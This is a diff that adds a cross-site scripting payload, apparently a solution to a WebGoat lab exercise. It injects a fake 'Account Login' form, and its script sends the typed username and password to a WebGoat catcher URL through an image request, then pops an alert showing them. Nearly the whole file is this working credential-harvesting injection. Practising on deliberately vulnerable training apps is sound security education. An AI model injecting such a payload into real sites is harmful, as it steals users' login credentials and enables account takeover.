@@ -1,0 +1,14 @@
+
+
+Part1:
+</form>
+<form><br><br><HR><H3>Account Login:</H3 ><br><br>Enter Username:<br><input type="text" name="username"><br>Enter Password:<br><input type="password" name = "password"><br><input type="submit" name="login" value="login" onclick="hacker()">
+
+
+<script>function hacker(){ 
+XSS=new Image; XSS.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user="+ document.forms[1].username.value + "&password=" + document.forms[1].password.value + ""; 
+alert("The system has been hacked User Name = " + document.forms[1].username.value + "Password = " + document.forms[1].password.value);
+} 
+</script>
+
+</form>
